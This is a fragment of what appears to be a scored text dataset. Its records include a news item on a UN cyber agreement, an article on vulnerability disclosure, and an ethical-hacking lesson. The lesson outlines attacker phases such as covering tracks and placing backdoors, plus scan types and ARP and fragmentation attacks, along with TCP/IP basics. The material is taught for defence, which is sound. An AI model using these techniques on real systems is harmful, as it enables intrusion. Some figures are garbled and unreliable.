ftp://ftp.circuitcellar.com/pub/Circuit_Cellar/2012/262. Google Authenticator, http://code.google.com/p/google-authenticator. Initiative for Open Authentication (OATH), www.openauthentication.org. Internet Engineering Task Force (IETF), www.ietf.org. D. M’Raihi, et al, “TOTP: Time-Based One-Time Password Algorithm,” IETF RFC 6238, 2011. —, “HOTP: An HMAC-Based One-Time Password Algorithm,” IETF RFC 4226, 2005. OATH Toolkit, www.nongnu.org/oath-toolkit. K. Schaffer, “Are Password Requirements Too Difficult?,” IEEE Computer Magazine, 2011. S. Sengupta, “Logging in With a Touch or a Phrase (Anything but a Password),” New York Times, 2011. IAR Embedded Workbench – IAR Systems eZ430-Chronos Wireless development system and Code Composer Studio (CCStudio) IDE – Texas Instruments, Inc.",
        "prob": "tensor([[2.0600e-06, 1.0000e+00]])"
    },
    {
        "text": "The US, UK, China and Russia are among 15 nations that have agreed to work together to reduce the threat of cyber attacks. The agreement, signed at the UN, represents a significant change in US posture, said Robert Knake, a cyberwarfare expert with the Council on Foreign Relations. Participation of the US demonstrates the Obama administration's strategy of diplomatic engagement, he said. The group has recommended the UN creates norms of accepted behaviour in cyberspace. It should also exchange information on national legislation and cybersecurity strategies, and strengthen the capacity of less-developed countries to protect their computer systems. When the group last met in 2005, they failed to find common ground. This time, by crafting a short text that left out controversial elements, they were able to reach a consensus. In the past, US efforts to work with other countries in cyberspace have centred on combatting crimes online, but did not deal with issues such as state involvement in or responsibility for cyber intrusions into critical computer systems. Others in the group are France, Germany, Estonia, Belarus, Brazil, India, Israel, Italy, Qatar, South Korea, and South Africa.",
        "prob": "tensor([[1.7542e-04, 9.9982e-01]])"
    },
    {
        "text": "Software Vulnerability Disclosure: The Chilling Effect How the Web makes creating software vulnerabilities easier, disclosing them more difficult and discovering them possibly illegal January 01, 2007 — CSO — Last February at Purdue University, a student taking \"cs390s—Secure Computing\" told his professor, Dr. Pascal Meunier, that a Web application he used for his physics class seemed to contain a serious vulnerability that made the app highly insecure. Such a discovery didn't surprise Meunier. \"It's a secure computing class; naturally students want to discover vulnerabilities.\" They probably want to impress their prof, too, who's a fixture in the vulnerability discovery and disclosure world. Dr. Meunier has created software that interfaces with vulnerability databases. He created ReAssure, a kind of vulnerability playground, a safe computing space to test exploits and perform what Meunier calls \"logically destructive experiments.\" He sits on the board of editors for the Common Vulnerabilities and Exposures (CVE) service, the definitive dictionary of all confirmed software bugs. And he has managed the Vulnerabilities Database and Incident Response Database projects at Purdue's Center for Education and Research in Information and Assurance, or Cerias, an acronym pronounced like the adjective that means \"no joke.\" When the undergraduate approached Meunier, the professor sensed an educational opportunity and didn't hesitate to get involved. \"We wanted to be good citizens and help prevent the exploit from being used,\" he says. In the context of vulnerable software, it would be the last time Meunier decided to be a good citizen. Meunier notified the authors of the physics department application that one of his students—he didn't say which one—had found a suspected flaw, \"and their response was beautiful,\" says Meunier. They found, verified and fixed the bug right away, no questions asked. But two months later, in April, the same physics department website was hacked. A detective approached Meunier, whose name was mentioned by the staff of the vulnerable website during questioning. The detective asked Meunier for the name of the student who had discovered the February vulnerability. The self-described \"stubborn idealist\" Meunier refused to name the student. He didn't believe it was in that student's character to hack the site and, furthermore, he didn't believe the vulnerability the student had discovered, which had been fixed, was even connected to the April hack. The detective pushed him. Meunier recalls in his blog: \"I was quickly threatened with the possibility of court orders, and the number of felony counts in the incident was brandished as justification for revealing the name of the student.\" Meunier's stomach knotted when some of his superiors sided with the detective and asked him to turn over the student. Meunier asked himself: \"Was this worth losing my job? Was this worth the hassle of responding to court orders, subpoenas, and possibly having my computers (work and personal) seized?\" Later, Meunier recast the downward spiral of emotions: \"I was miffed, uneasy, disillusioned.\"",
        "prob": "tensor([[2.0562e-06, 1.0000e+00]])"
    },
    {
        "text": "Continuation of Ethical Hacking Basics Class part 1 The Transmission Control Protocol/Internet Protocol (TCP/IP) suite is so dominant and important to ethical hacking that it is given wide coverage in this lesson. Many tools, attacks, and techniques that will be covered throughout this class are based on the use and misuse of TCP/IP protocol suite. Understanding its basic functions will advance your security skills. This lesson also spends time reviewing the attackerís process and some of the better known methodologies used by ethical hackers. State the process or methodology hackers use to attack networks Attackers follow a fixed methodology. To beat a hacker, you have to think like one, so itís important to understand the methodology. The steps a hacker follows can be broadly divided into six phases, which include pre-attack and attack phases: - Performing Reconnaissance - Scanning and enumeration - Gaining access - Escalation of privilege - Maintaining access - Covering tracks and placing backdoors A denial of service (DoS) might be included in the preceding steps if the attacker has no success in gaining access to the targeted system or network. Letís look at each of these phases in more detail so that you better understand the steps. Reconnaissance is considered the first pre-attack phase and is a systematic attempt to locate, gather, identify, and record information about the target. The hacker seeks to find out as much information as possible about the victim. This first step is considered a passive information gathering. As an example, many of you have probably seen a detective movie in which the policeman waits outside a suspectís house all night and then follows him from a distance when he leaves in the car. Thatís reconnaissance; it is passive in nature, and, if done correctly, the victim never even knows it is occurring. Hackers can gather information in many different ways, and the information they obtain allows them to formulate a plan of attack. Some hackers might dumpster dive to find out more about the victim. Dumpster diving is the act of going through the victimís trash. If the organization does not have good media control policies, many types of sensitive information will probably go directly in the trash. Organizations should inform employees to shred sensitive information or dispose of it in an approved way. Donít think that you are secure if you take adequate precautions with paper documents. Another favorite of the hacker is social engineering. A social engineer is a person who can smooth talk other individuals into revealing sensitive information. This might be accomplished by calling the help desk and asking someone to reset a password or by sending an email to an insider telling him he needs to reset an account. If the hacker is still struggling for information, he can turn to what many consider the hackerís most valuable reconnaissance tool, the Internet. Thatís right; the Internet offers the hacker a multitude of possibilities for gathering information. Letís start with the company website. The company website might have key employees listed, technologies used, job listings probably detailing software and hardware types used, and some sites even have databases with employee names and email addresses. Scanning and enumeration is considered the second pre-attack phase. Scanning is the active step of attempting to connect to systems to elicit a response. Enumeration is used to gather more in-depth information about the target, such as open shares and user account information. At this step in the methodology, the hacker is moving from passive information gathering to active information gathering. Hackers begin injecting packets into the network and might start using scanning tools such as Nmap. The goal is to map open ports and applications. The hacker might use techniques to lessen the chance that he will be detected by scanning at a very slow rate. As an example, instead of checking for all potential applications in just a few minutes, the scan might take days to verify what applications are running. Many organizations use intrusion detection systems(IDS) to detect just this type of activity. Donít think that the hacker will be content with just mapping open ports. He will soon turn his attention to grabbing banners. He will want to get a good idea of what type of version of software applications you are running. And, he will keep a sharp eye out for down-level software and applications that have known vulnerabilities. An example of down-level software would be Windows 95. One key defense against the hacker is the practice of deny all. The practice of the deny all rule can help reduce the effectiveness of the hackerís activities at this step. Deny all means that all ports and applications are turned off, and only the minimum number of applications and services are turned on that are needed to accomplish the organizationís goals. Unlike the elite black hat hacker who attempts to remain stealth, script kiddies might even use vulnerability scanners such as Nessus to scan a victimís network. Although the activities of the black hat hacker can be seen as a single shot in the night, the script kiddies scan will appear as a series of shotgun blasts, as their activity will be loud and detectable. Programs such as Nessus are designed to find vulnerabilities but are not designed to be a hacking tool; as such, they generate a large amount of detectable network traffic. The greatest disadvantage of vulnerability scanners is that they are very noisy. As far as potential damage, this could be considered one of the most important steps of an attack. This phase of the attack occurs when the hacker moves from simply probing the network to actually attacking it. After the hacker has gained access, he can begin to move from system to system, spreading his damage as he progresses. Access can be achieved in many different ways. A hacker might find an open wireless access point that allows him a direct connection or the help desk might have given him the phone number for a modem used for out-of-band management. Access could be gained by finding a vulnerability in the web serverís software. If the hacker is really bold, he might even walk in and tell the receptionist that he is late for a meeting and will wait in the conference room with network access. Pity the poor receptionist who unknowingly provided network access to a malicious hacker. These things do happen to the company that has failed to establish good security practices and procedures. The factors that determine the method a hacker uses to access the network ultimately comes down to his skill level, amount of access he achieves, network architecture, and configuration of the victimís network. Although the hacker is probably happy that he has access, donít expect him to stop what he is doing with only a ďJoe userĒ account. Just having the access of an average user probably wonít give him much control or access to the network. Therefore, the attacker will attempt to escalate himself to administrator or root privilege. After all, these are the individuals who control the network, and that is the type of power the hacker seeks. Privilege escalation can best be described as the act of leveraging a bug or vulnerability in an application or operating system to gain access to resources that normally would have been protected from an average user. The end result of privilege escalation is that the application performs actions that are running within a higher security context than intended by the designer, and the hacker is granted full access and control. Would you believe that hackers are paranoid people? Well, many are, and they worry that their evil deeds might be uncovered. They are diligent at working on ways to maintain access to the systems they have attacked and compromised. They might attempt to pull down the etc/passwd file or steal other passwords so that they can access other userís accounts. Rootkits are one option for hackers. A rootkit is a set of tools used to help the attacker maintain his access to the system and use it for malicious purposes. Rootkits have the capability to mask the hacker, hide his presence, and keep his activity secret. They will be discussed in detail later on in the class. Sometimes hackers might even fix the original problem that they used to gain access, where they can keep the system to themselves. After all, who wants other hackers around to spoil the fun? Sniffers are yet another option for the hacker and can be used to monitor the activity of legitimate users. At this point, hackers are free to upload, download, or manipulate data as they see fit. Nothing happens in a void, and that includes computer crime. Hackers are much like other criminals in that they would like to be sure to remove all evidence of their activities. This might include using rootkits or other tools to cover their tracks. Other hackers might hunt down log files and attempt to alter or erase them. Hackers must also be worried about the files or programs they leave on the compromised system. File hiding techniques, such as hidden directories, hidden attributes, and Alternate Data Streams (ADS), can be used. As an ethical hacker, you will need to be aware of these tools and techniques to discover their activities and to deploy adequate countermeasures. Backdoors are methods that the hacker can use to reenter the computer at will. The tools and techniques used to perform such activities are discussed later on in the class. At this point, what is important is to identify the steps. As an ethical hacker, you will follow a similar process to one that an attacker uses. The stages you progress through will map closely to those the hacker uses, but you will work with the permission of the company and will strive to ďdo no harm.Ē By ethical hacking and assessing the organizations strengths and weaknesses, you will perform an important service in helping secure the organization. The ethical hacker plays a key role in the security process. The methodology used to secure an organization can be broken down into five key steps. Ethical hacking is addressed in the first: Ethical hacking, penetration testing, and hands-on security tests. - Policy Development Development of policy based on the organizationís goals and mission. The focus should be on the organizationís critical assets. The building of technical, operational, and managerial controls to secure key assets and data. Employees need to be trained as to how to follow policy and how to configure key security controls, such as Intrusion Detection Systems (IDS) and firewalls. Auditing involves periodic reviews of the controls that have been put in place to provide good security. Regulations such as Health Insurance Portability and Accountability Act (HIPAA) specify that this should be done yearly. All hacking basically follows the same six-step methodology discussed in the previous section: reconnaissance, scanning and enumeration, gaining access, escalation of privilege, maintaining access, and covering tracks and placing backdoors. Is this all you need to know about methodologies? No, different organizations have developed diverse ways to address security testing. There are some basic variations you should be aware of. These include National Institute of Standards and Technology 800-42, Threat and Risk Assessment Working Guide, Operational Critical Threat, Asset, fand Vulnerability Evaluation, and Open Source Security Testing Methodology Manual. Each is discussed next. The NIST 800-42 method of security assessment is broken down into four basic stages that Include: NIST has developed many standards and practices for good security. This methodology is contained in NIST 800-42. This is just one of several documents available to help guide you through an assessment. Find out more at http://csrc.nist.gov/publications/nistpubs. The Threat and Risk Assessment Working Guide provides guidance to individuals or teams carrying out a Threat and Risk Assessment (TRA) for an existing or proposed IT system. This document helps provide IT security guidance and helps the user determine which critical assets are most at risk within that system and develop recommendations for safeguards. Find out more at http://www.cse-cst.gc.ca/publication.../itsg04-e.html. OCTAVE focuses on organizational risk and strategic, practice-related issues. OCTAVE is driven by operational risk and security practices. OCTAVE is self-directed by a small team of people from the organizationís operational, business units, and the IT department. The goal of OCTAVE is to get departments to work together to address the security needs of the organization. The team uses the experience of existing employees to define security, identify risks, and build a robust security strategy. Find out more at www.cert.org/octave. One well-known open sourced methodology is the OSSTMM. The OSSTMM divides security assessment into six key points known as sections. They are as follows: * Physical Security * Internet Security * Information Security * Wireless Security * Communications Security * Social Engineering The OSSTMM gives metrics and guidelines as to how many man-hours a particular assessment will require. Anyone serious about learning more about security assessment should review this documentation. The OSSTMM outlines what to do before, during, and after a security test. Find out more at www.isecom.org/osstmm. To really understand many of the techniques and tools that hackers use, you need to understand how systems and devices communicate. Hackers understand this, and many think outside the box when planning an attack or developing a hacking tool. As an example, TCP uses flags to communicate, but what if a hacker sends TCP packets with no flags set? Sure, it breaks the rules of the protocol, but it might allow the attacker to illicit a response to help identify the server. As you can see, having the ability to know how a protocol, service, or application works and how it can be manipulated can be beneficial. The OSI model and TCP/IP are discussed in the next sections. Pay careful attention to the function of each layer of the stack, and think about what role each layer plays in the communication process. Understand the Open Systems Interconnect (OSI) Model Once upon a time, the world of network protocols was much like the Wild West. Everyone kind of did their own thing, and if there were trouble, there would be a shoot-out on Main Street. Trouble was, you never knew whether you were going to get hit by a stray bullet. Luckily, the IT equivalent of the sheriff came to town. This was the International Standards Organization (ISO). The ISO was convinced that there needed to be order and developed the Open Systems Interconnect (OSI) model in 1984. The model is designed to provide order by specifying a specific hierarchy in which each layer builds on the output of each adjacent layer. Although its role as sheriff was not widely accepted by all, the model is still used today as a guide to describe the operation of a networking environment. There are seven layers of the OSI model: the Application, Presentation, Session, Transport, Network, Data Link, and Physical layers. The seven layers of the OSI model are shown in Figure 2.1, which overviews data moving between two systems up and down the stack, and described in the following list: Layer 7 is known as the Application layer. Recognized as the top layer of the OSI model, this layer serves as the window for application services. The Application layer is one that most users are familiar with as it is the home of email programs, FTP, Telnet, web browsers, and office productivity suites, as well as many other applications. It is also the home of many malicious programs such as viruses, worms, Trojan horse programs, and other virulent applications.Presentation layer Layer 6 is known as the Presentation layer. The Presentation layer is responsible for taking data that has been passed up from lower levels and putting it into a format that Application layer programs can understand. These common formats include American Standard Code for Information Interchange (ASCII), Extended Binary-Coded Decimal Interchange Code (EBCDIC), and American National Standards Institute (ANSI). From a security standpoint, the most critical process handled at this layer is encryption and decryption. If properly implemented, this can help security data in transit.Session layer Layer 5 is known as the Session layer. Its functionality is put to use when creating, controlling, or shutting down a TCP session. Items such as the TCP connection establishment and TCP connection occur here. Session-layer protocols include items such as Remote Procedure Call and SQLNet from Oracle. From a security standpoint, the Session layer is vulnerable to attacks such as session hijacking. A session hijack can occur when a legitimate user has his session stolen by a hacker. This will be discussed in detail in lesson 7, \"Sniffers, Session Hijacking, and Denial of Service \".Transport layer Layer 4 is known as the Transport layer. The Transport layer ensures completeness by handling end-to-end error recovery and flow control. Transport-layer protocols include TCP, a connection-oriented protocol. TCP provides reliable communication through the use of handshaking, acknowledgments, error detection, and session teardown, as well as User Datagram Protocol (UDP), a connectionless protocol. UDP offers speed and low overhead as its primary advantage. Security concerns at the transport level include Synchronize(SYN) attacks, Denial of Service(DoS), and buffer overflows.Network layer Layer 3 is known as the Network layer. This layer is concerned with logical addressing and routing. The Network layer is the home of the Internet Protocol (IP), which makes a best effort at delivery of datagrams from their source to their destination. Security concerns at the network level include route poisoning, DoS, spoofing, and fragmentation attacks. Fragmentation attacks occur when hackers manipulate datagram fragments to overlap in such a way to crash the victimís computer. IPSec is a key security service that is available at this layer.Data Link layer Layer 2 is known as the Data Link layer. The Data Link layer is responsible for formatting and organizing the data before sending it to the Physical layer. The Data Link layer organizes the data into frames. A frameis a logical structure in which data can be placed; itís a packet on the wire. When a frame reaches the target device, the Data Link layer is responsible for stripping off the data frame and passing the data packet up to the Network layer. The Data Link layer is made up of two sub layers, including the logical link control layer (LLC) and the media access control layer (MAC). You might be familiar with the MAC layer, as it shares its name with the MAC addressing scheme. These 6-byte (48-bit) addresses are used to uniquely identify each device on the local network. A major security concern of the Data Link layer is the Address Resolution Protocol (ARP) process. ARP is used to resolve known Network layer addresses to unknown MAC addresses. ARP is a trusting protocol and, as such, can be used by hackers for APR poisoning, which can allow them access to traffic on switches they should not have.Physical layer Layer 1 is known as the Physical layer. At Layer 1, bit-level communication takes place. The bits have no defined meaning on the wire, but the Physical layer defines how long each bit lasts and how it is transmitted and received. From a security standpoint, you must be concerned anytime a hacker can get physical access. By accessing a physical component of a computer networkósuch as a computer, switch, or cableóthe attacker might be able to use a hardware or software packet snifferto monitor traffic on that network. Sniffers enable attacks to capture and decode packets. If no encryption is being used, a great deal of sensitive information might be directly available to the hacker.TIP For the exam, make sure that you know which attacks and defenses are located on each layer. Have a basic knowledge of the Transmission Control Protocol/Internet Protocol (TCP/IP) and their functionality Describe the basic TCP/IP frame structure Four main protocols form the core of TCP/IP: the Internet Protocol (IP), the Transmission Control Protocol (TCP), the User Datagram Protocol (UDP), and the Internet Control Message Protocol (ICMP). These protocols are essential components that must be supported by every device that communicates on a TCP/IP network. Each serves a distinct purpose and is worthy of further discussion. The four layers of the TCP/IP stack are shown in Figure 2.2. The figure lists the Application, Host-to-host, Internet, and Network Access layers and describes the function of each. TCP/IP is the foundation of all modern networks. In many ways, you can say that TCP/IP has grown up along with the development of the Internet. Its history can be traced back to standards adopted by the U.S. governmentís Department of Defense (DoD) in 1982. Originally, the TCP/IP model was developed as a flexible, fault tolerant set of protocols that were robust enough to avoid failure should one or more nodes go down. After all, the network was designed to these specifications to withstand a nuclear strike, which might destroy key routing nodes. The designers of this original network never envisioned the Internet we use today. Because TCP/IP was designed to work in a trusted environment, many TCP/IP protocols are now considered insecure. As an example, Telnet is designed to mask the password on the userís screen, as the designers didnít want shoulder surfers stealing a password; however, the password is sent in clear text on the wire. Little concern was ever given to the fact that an untrustworthy party might have access to the wire and be able to sniff the clear text password. Most networks today run TCP/IPv4. Many security mechanisms in TCP/IPv4 are add-ons to the original protocol suite. As the layers are stacked one atop another, encapsulation takes place. Encapsulation is the technique of layering protocols in which one layer adds a header to the information from the layer above. An example of this can be seen in Figure 2.3. This screenshot from a sniffer program has UDP highlighted. A lot of free packet sniffing utilities are available on the Internet. Consider evaluating Packetyzer for Windows or Ethereal for Linux. There are also many commercial sniffing tools, such as Sniffer by Network General. These tools can help you learn more about encapsulation and packet structure. Letís take a look at each of the four layers of TCP/IP and discuss some of the security concerns lassociated with each layer and specific protocols. The four layers of TCP/IP include - The Application layer - The Host-to-host layer - The Internet layer - The Network access layer Describe application ports and how they are numbered The Application layer sets at the top of the protocol stack. This layer is responsible for application support. Applications are typically mapped not by name, but by their corresponding port. Ports are placed into TCP and UDP packets so that the correct application can be passed to the required protocols below. Although a particular service might have an assigned port, nothing specifies that services cannot listen on another port. A common example of this is Simple Mail Transfer Protocol (SMTP). The assigned port of this is 25. Your cable company might block port 25 in an attempt to keep you from running a mail server on your local computer; however, nothing prevents you from running your mail server on another local port. The primary reason services have assigned ports is so that a client can easily find that service on a remote host. As an example, FTP servers listen at port 21, and Hypertext Transfer Protocol (HTTP) servers listen at port 80. Client applications, such as a File Transfer Protocol (FTP) program or browser, use randomly assigned ports typically greater than 1023. There are approximately 65,000 ports; they are divided into well-known ports (0Ė1023), registered ports (1024Ė49151), and dynamic ports (49152Ė65535). Although there are hundreds of ports and corresponding applications in practice, less than a hundred are in common use. The most common of these are shown in Table 2.1. These are some of the ports that a hacker would look for first on a victimís computer systems. TABLE 2.1 Common Ports and Protocols Port Service Protocol 21 FTP TCP 22 SSH TCP 23 Telnet TCP 25 SMTP TCP 53 DNS TCP/UDP 67/68 DHCP UDP 69 TFTP UDP 79 Finger TCP 80 HTTP TCP 88 Kerberos UDP 110 POP3 TCP 111 SUNRPC TCP/UDP 135 MS RPC TCP/UDP 139 NB Session TCP/UDP 161 SNMP UDP 162 SNMP Trap UDP 389 LDAP TCP 443 SSL TCP 445 SMB over IP TCP/UDP 1433 MS-SQL TCP The following list discusses the operation and security issues of some of the common applications: File Transfer Protocol (FTP) FTP is a TCP service and operates on ports 20 and 21. This application is used to move files from one computer to another. Port 20 is used for the data stream and transfers the data between the client and the server. Port 21 is the control stream and is used to pass commands between the client and the FTP server. Attacks on FTP target misconfigured directory permissions and compromised or sniffed clear-text passwords. FTP is one of the most commonly hacked services.Telnet Telnet is a TCP service that operates on port 23. Telnet enables a client at one site to establish a session with a host at another site. The program passes the information typed at the clientís keyboard to the host computer system. Although Telnet can be configured to allow anonymous connections, it should be configured to require usernames and passwords. Unfortunately, even then, Telnet sends them in clear text. When a user is logged in, he or she can perform any allowed task. Applications, such as Secure Shell (SSH), should be considered as a replacement. SSH is a secure replacement for Telnet and does not pass cleartext username and passwords.Simple Mail Transfer Protocol (SMTP) This application is a TCP service that operates on port 25. It is designed for the exchange of electronic mail between networked systems. Messages sent through SMTP have two parts: an address header and the message text. All types of computers can exchange messages with SMTP. Spoofing and spamming are two of the vulnerabilities associated with SMTP.Domain Name Service (DNS) This application operates on port 53 and performs address translation. Although we sometimes realize the role DNS plays, it serves a critical function in that it converts fully qualified domain names (FQDNs) into a numeric IP address or IP addresses into FQDNs. If someone were to bring down DNS, the Internet would continue to function, but it would require that Internet users know the IP address of every site they want to visit. For all practical purposes, the Internet would not be useable without DNS.The DNS database consists of one or more zone files. Each zone is a collection of structured resource records. Common record types include the Start of Authority(SOA) record, A record, CNAME record, NS record, PTR record, and the MX record. There is only one SOA record in each zone database file. It describes the zone name space. The A record is the most common, as it contains IP addresses and names of specific hosts. The CNAME record is an alias. For example, the outlaw William H. Bonney went by the alias of Billy the Kid. The NS record lists the IP address of other name servers. An MX recordis a mail exchange record. This record has the IP address of the server where email should be delivered. Hackers can target DNS servers with many types of attacks. One such attack is DNS cache poisoning. This type of attack sends fake entries to a DNS server to corrupt the information stored there. DNS can also be susceptible to DoS attacks and to unauthorized zone transfers. DNS uses UDP for DNS queries and TCP for zone transfers. Trivial File Transfer Protocol (TFTP) TFTP operates on port 69. It is considered a down-and-dirty version of FTP as it uses UDP to cut down on overhead. It not only does so without the session management offered by TCP, but it also requires no authentication, which could pose a big security risk. It is used to transfer router configuration files and by cable companies to configure cable modems. TFTP is a favorite of hackers and has been used by programs, such as the Nimda worm, to move data without having to use input usernames or passwords.Hypertext Transfer Protocol (HTTP) HTTP is a TCP service that operates on port 80. This is one of the most well-known applications. HTTP has helped make the Web the popular protocol it is today. The HTTP connection model is known as a stateless connection. HTTP uses a request response protocol in which a client sends a request and a server sends a response. Attacks that exploit HTTP can target the server, browser, or scripts that run on the browser. Code Red is an example of code that targeted a web server.Simple Network Management Protocol(SNMP) SNMP is a UDP service and operates on ports 161 and 162. It was envisioned to be an efficient and inexpensive way to monitor networks. The SNMP protocol allows agents to gather information, including network statistics, and report back to their management stations. Most large corporations have implemented some type of SNMP management. Some of the security problems that plague SNMP are caused by the fact that community strings can be passed as clear text and that the default community strings (public/private) are well known. SNMP version 3 is the most current, and it offers encryption for more robust security.TIP A basic understanding of these applicationsí strengths and weaknesses will be needed for the exam. Describe the TCP packet structure Know the TCP flags and their meaning Understand how UDP differs from TCP The host-to-host layer provides end-to-end delivery. Two primary protocols are located at the host-to-host layer, which includes Transmission Control Protocol (TCP) and User Datagram Protocol (UDP). TCP enables two hosts to establish a connection and exchange data reliably. To do this, TCP performs a three-step handshake before data is sent. During the data-transmission process, TCP guarantees delivery of data by using sequence and acknowledgment numbers. At the completion of the data-transmission process, TCP performs a four-step shutdown that gracefully concludes the session. The startup and shutdown sequences are shown in Figure 2.4. TCP has a fixed packet structure that is used to provide flow control, maintain reliable communication, and ensure that any missing data is resent. At the heart of TCP is a 1-byte flag field. Flags help control the TCP process. Common flags include synchronize (SYN), acknowledgement (ACK), push (PSH), and finish (FIN). Figure 2.5 details the TCP packet structure. TCP security issues include TCP sequence number attacks, session hijacking, and SYN flood attacks. Programs, such as Nmap, manipulate TCP flags to attempt to identify active hosts. The ports shown previously in Table 2.1 identify the source and target application, whereas the sequence and acknowledgement numbers are used to assemble packets into their proper order. The flags are used to manage TCP sessionsófor example, the synchronize (SYN) and acknowledge (ACK) flags are used in the three-way handshaking, whereas the reset (RST) and finish (FIN) flags are used to tear down a connection. FIN is used during a normal four-step shutdown, whereas RST is used to signal the end of an abnormal session. The checksum is used to ensure that the data is correct, although an attacker can alter a TCP packet and the checksum to make it appear valid. Other flags include urgent (URG). If no flags are set at all, the flags can be referred to as Null, as none are set. Not all hacking tools play by the rules; most port scanners can tweak TCP flags and send them in packets that should not normally exist in an attempt to illicit a response for the victimís server. One such variation is the XMAS tree scan, which sets the SYN, URG, and PSH flags. Another is the NULL scan, which sets no flags in the TCP header. UDP performs none of the handshaking processes that we see performed with TCP. Although that makes it considerably less reliable than TCP, it does offer the benefit of speed. It is ideally suited for data that requires fast delivery and is not sensitive to packet loss. UDP is used by services such as DHCP and DNS. UDP is easier to spoof by attackers than TCP as it does not use sequence and acknowledgement numbers. Figure 2.6 shows the packet structure of UDP. Describe how Internet Control Message Protocol (ICMP) functions and its purpose The Internet layer contains two important protocols: Internet Protocol (IP) and Internet Control Messaging Protocol (ICMP). IP is a routable protocol whose function is to make a best effort at delivery. The IP header is shown in Figure 2.7. Spend a few minutes reviewing it to better understand each fieldís purpose and structure. While reviewing the structure of UDP, TCP, and IP, packets might not be the most exciting part of security work. A basic understanding is desirable because many attacks are based on manipulation of the packets. For example, the total length field and fragmentation is tweaked in a ping of death attack. IP addresses are laid out in a dotted decimal notation format. IPv4 lays out addresses into a four decimal number format that is separated by decimal points. Each of these decimal numbers is one byte in length to allow numbers to range from 0Ė255. Table 2.2 shows IPv4 addresses and the number of available networks and hosts. TABLE 2.2 Ipv4 Addressing Address Class | Address Range | Number of Networks | Number of Hosts A 1-126 126 16,777,214 B 128-191 16,384 65,534 C 192-223 2,097152 254 D 224-239 NA NA E 240-255 NA NA TABLE 2.3 Private Address Ranges Address Class Address Range Default Subnet Mask A 10.0.0.0 - 10.255.255.255.255 255.0.0.0 B 172.16.0.0 - 172.31.255.255 255.255.0.0 C 192.168.0.0 - 192.168.255.255 255.255.255.0 Source routing was designed to allow individuals the ability to specify the route that a packet should take through a network. It allows the user to bypass network problems or congestion. IPís source routing informs routers not to use their normal routes for delivery of the packet but to send it via the router identified in the packetís header. This lets a hacker use another systemís IP address and get packets returned to him regardless of what routes are in between him and the destination. This type of attack can be used if the victimís web server is protected by an access list based on source addresses. If the hacker were to simply spoof one of the permitted source addresses, traffic would never be returned to him. By spoofing an address and setting the loose source routing option to force the response to return to the hackerís network, the attack might succeed. The best defense against this type of attack is to block loose source routing and not respond to packets set with this option. If IP must send a datagram larger than allowed by the network access layer that it uses, the datagram must be divided into smaller packets. Not all network topologies can handle the same datagram size; therefore, fragmentation is an important function. As IP packets pass through routers, IP reads the acceptable size for the network access layer. If the existing datagram is too large, IP performs fragmentation and divides the datagram into two or more packets. Each packet is labeled with a length, an offset, and a more bit. The length specifies the total length of the fragment, the offset specifies the distance from the first byte of the original datagram, and the more bit is used to indicate if the fragment has more to follow or if it is the last in the series of fragments. An example is shown in Figure 2.8. The first fragment has an offset of 0 and occupies bytes 0Ė999. The second fragment has an offset of 1,000 and occupies bytes 1,000Ė1,999. The third fragment has an offset of 2,000 and occupies bytes 2,000Ė2,999, and the final fragment has an offset 3,000 and occupies bytes 3,000Ė3,599. Whereas the first three fragments have the more bit set to 1, the final fragment has the more bit set to 0 because no more fragments follow. These concepts are important to understand how various attacks function. If you are not completely comfortable with these concepts, you might want to review a general TCP/IP network book. TCP/IP Illustrated by Richard Stevens is recommended. On modern networks, there should be very little fragmentation. Usually such traffic will indicate malicious activities. To get a better idea of how fragmentation can be exploited by hackers, consider the following: Normally, these fragments follow the logical structured sequence as shown in Figure 2.8. Hackers can manipulate packets to cause them to overlap abnormally, as shown in Figure 2.9. Hackers can also craft packets so that instead of overlapping, there will be gaps between various packets. These nonadjacent fragmented packets are similar to overlapping packets because they can crash or hang older operating systems that have not been patched. A good example of the overlapping fragmentation attack is the teardrop attack. The teardrop attack exploits overlapping IP fragment and can crash Windows 95, Windows NT, and Windows 3.1 machines. One of the other protocols residing at the Internet layer is ICMP. Its purpose is to provide feedback used for diagnostics or to report logical errors. ICMP messages follow a basic format. The first byte of an ICMP header indicates the type of ICMP message. The following byte contains the code for each particular type of ICMP. The ICMP type generally defines the problem, whereas the code is provided to allow a specific reason of what the problem is. As an example, a Type 3, Code 3 ICMP means that there was a destination error and that the specific destination error is that the targeted port is unreachable. Eight of the most common ICMP types are shown in Table 2.4. TABLE 2.4 ICMP Types and Codes Type Code Function 0/8 0 Echo Response/Request (Ping) 3 0-15 Destination Unreachable 4 0 Source Quench 5 0-3 Redirect 11 0-1 Time Exceeded 12 0 Parameter Fault 13/14 0 Time Stamp Request/Response 17/18 0 Subnet Mask Request/Response TABLE 2.5 Type 3 Codes Code Function 0 Net Unreachable 1 Host Unreachable 2 Protocol Unreachable 3 Port Unreachable 4 Fragmentation Needed and Don't Fragment was Set 5 Source Route Failed 6 Destination Network Unknown 7 Destination Host Unknown 8 Source Host Isolated 9 Communication with Destination Network is Administratively Prohibited 10 Communication with Destination Host is Administratively Prohibited 11 Destination Network Unreachable for Type of Service 12 Destination Host Unreachable for Type of Service 13 Communication Administratively Prohibited Type 11 ICMP time exceeded messages are used by most traceroute programs to determine the IP addresses of intermediate routers. Address Resolution Protocol (ARP) is the final protocol reviewed at the IP layer. ARPís role in the world of networking is to resolve known IP addresses to unknown MAC addresses. ARPís two-step resolution process is performed by first sending a broadcast message requesting the targetís physical address. If a device recognizes the address as its own, it issues an ARP reply containing its MAC address to the original sender. The MAC address is then placed in the ARP cache and used to address subsequent frames. You discover that hackers are interested in the ARP process as it can be manipulated to bypass the functionality of a switch. Because ARP was developed in a trusting world, bogus ARP responses are accepted as valid, which can allow attackers to redirect traffic on a switched network. Proxy ARPs can be used to extend a network and enable one device to communicate with a device on an adjunct node. ARP attacks play a role in a variety of man-in-the middle attacks, spoofing, and in-session hijack attacks. ARP is unauthenticated and, as such, can be used for unsolicited ARP replies, for poisoning the ARP table, and for spoofing another host. The network access layer is the bottom of the stack. This portion of the TCP/IP network model is responsible for the physical delivery of IP packets via frames. Ethernet is the most commonly used LAN frame type. Ethernet frames are addressed with MAC addresses that identify the source and destination device. MAC addresses are 6 bytes long and are unique to the Network Interface card (NIC) card in which they are burned. To get a better idea of what MAC addresses look like, review Figure 2.10, as it shows a packet with both the destination and source MAC addresses. Hackers can use a variety of programs to spoof MAC addresses. Spoofing MAC addresses can be a potential target to attackers attempting to bypass 802.11 wireless controls or when switches are used to control traffic by locking ports to specific MAC addresses. MAC addresses can be either unicast, multicast, or broadcast. Although a destination MAC address can be any one of these three types, a frame will always originate from a unicast MAC 